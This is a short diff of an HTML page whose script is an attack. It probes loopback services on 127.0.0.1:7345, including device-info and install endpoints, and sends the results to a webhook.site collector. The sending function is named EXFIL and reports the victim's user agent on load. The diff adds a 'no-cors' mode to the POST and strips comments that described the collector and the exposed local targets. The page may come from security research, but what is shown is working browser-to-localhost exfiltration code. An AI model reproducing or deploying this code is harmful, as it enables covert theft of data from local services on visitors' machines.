@@ -3,13 +3,13 @@
 <head><meta charset="utf-8"></head>
 <body>
 <script>
-// Your exfil endpoint - a simple server that logs POST bodies
 const EXFIL = 'https://webhook.site/f223977d-60e6-4b93-8ae2-201d550e29c0';
 
 async function send(data) {
   try {
     await fetch(EXFIL, {
       method: 'POST',
+      mode: 'no-cors',
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(data)
     });
@@ -29,7 +29,6 @@ async function probe(url, opts) {
 async function main() {
   send({status: 'alive', ua: navigator.userAgent});
 
-  // Core targets - these may be completely open from loopback
   const targets = [
     'http://127.0.0.1:7345/state/device/deviceinfo',
     'http://127.0.0.1:7345/scpl/install',
